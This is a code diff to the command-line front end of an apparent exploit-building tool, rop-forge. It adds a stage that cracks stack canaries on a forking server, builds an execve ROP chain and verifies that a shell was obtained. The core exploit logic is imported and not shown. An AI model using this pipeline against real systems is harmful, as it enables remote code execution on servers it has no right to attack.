@@ -4,6 +4,7 @@ import argparse
 import sys
 
 from rop_forge.analyzer import Protections, analyze_protections
+from rop_forge.canary import CanaryNotFoundError, build_canary_execve_chain, crack_canary, verify_canary_shell
 from rop_forge.chainer import (
     Chain,
     ChainNotFoundError,
@@ -19,7 +20,7 @@ from rop_forge.offset import OffsetNotFoundError, find_offset
 
 _EXAMPLES_PER_KIND = 5
 
-STAGES = ["analyzer", "gadgets", "offset", "chainer", "leak", "exploit"]
+STAGES = ["analyzer", "gadgets", "offset", "chainer", "leak", "canary", "exploit"]
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -41,8 +42,12 @@ def build_parser() -> argparse.ArgumentParser:
             "--stage chainer to the leak-based flow: probes this server for "
             "the overflow offset and libc's real runtime base, then builds/"
             "verifies the chain against it, instead of the aslr=False "
-            "stand-in build_execve_chain() uses. (--stage leak always takes "
-            "a server binary directly as its positional `binary` argument.)"
+            "stand-in build_execve_chain() uses. If the target (per "
+            "--stage analyzer) also has a stack canary, --stage chainer "
+            "additionally cracks it first (see --stage canary) before "
+            "probing — same forking server either way. (--stage leak/canary "
+            "always take a server binary directly as their positional "
+            "`binary` argument.)"
         ),
     )
     parser.add_argument(
@@ -106,30 +111,34 @@ def _resolve_libc(args: argparse.Namespace) -> str:
     return str(libc_path)
 
 
+def _print_shell_result(ok: bool) -> int:
+    print()
+    print("Shell verified — got real command execution" if ok else "Shell verification failed")
+    return 0 if ok else 4
+
+
 def _run_chainer(args: argparse.Namespace) -> int:
     if args.server:
+        libc_path = _resolve_libc(args)
         with ForkingServer(args.server) as server:
-            chain, offset = build_leaked_execve_chain(server, _resolve_libc(args))
+            if analyze_protections(args.binary).canary:
+                chain, header = build_canary_execve_chain(server, libc_path)
+                _print_chain(chain)
+                if args.run:
+                    return _print_shell_result(verify_canary_shell(server, header, chain))
+                return 0
+
+            chain, offset = build_leaked_execve_chain(server, libc_path)
             _print_chain(chain)
             if args.run:
-                ok = verify_leaked_shell(server, chain, offset)
-                print()
-                print(
-                    "Shell verified — got real command execution"
-                    if ok
-                    else "Shell verification failed"
-                )
-                return 0 if ok else 4
+                return _print_shell_result(verify_leaked_shell(server, chain, offset))
         return 0
 
     chain = build_execve_chain(args.binary, libc_path=args.libc)
     _print_chain(chain)
     if args.run:
         offset = find_offset(args.binary)
-        ok = verify_shell(args.binary, chain, offset)
-        print()
-        print("Shell verified — got real command execution" if ok else "Shell verification failed")
-        return 0 if ok else 4
+        return _print_shell_result(verify_shell(args.binary, chain, offset))
     return 0
 
 
@@ -138,6 +147,14 @@ def _run_leak(args: argparse.Namespace) -> int:
         result = probe(server, _resolve_libc(args))
     print(f"Offset to return address: {result.offset} bytes")
     print(f"Libc runtime base: 0x{result.libc_base:x}")
+    return 0
+
+
+def _run_canary(args: argparse.Namespace) -> int:
+    with ForkingServer(args.binary) as server:
+        result = crack_canary(server)
+    print(f"Offset to canary: {result.offset} bytes")
+    print(f"Canary: {result.canary.hex()}")
     return 0
 
 
@@ -155,6 +172,7 @@ STAGE_RUNNERS = {
     "offset": _run_offset,
     "chainer": _run_chainer,
     "leak": _run_leak,
+    "canary": _run_canary,
     "exploit": _stage_not_yet_implemented("exploit"),
 }
 
@@ -185,6 +203,9 @@ def main(argv: list[str] | None = None) -> int:
         print(f"rop-forge: {exc}", file=sys.stderr)
         return 3
     except LeakError as exc:
+        print(f"rop-forge: {exc}", file=sys.stderr)
+        return 3
+    except CanaryNotFoundError as exc:
         print(f"rop-forge: {exc}", file=sys.stderr)
         return 3
 
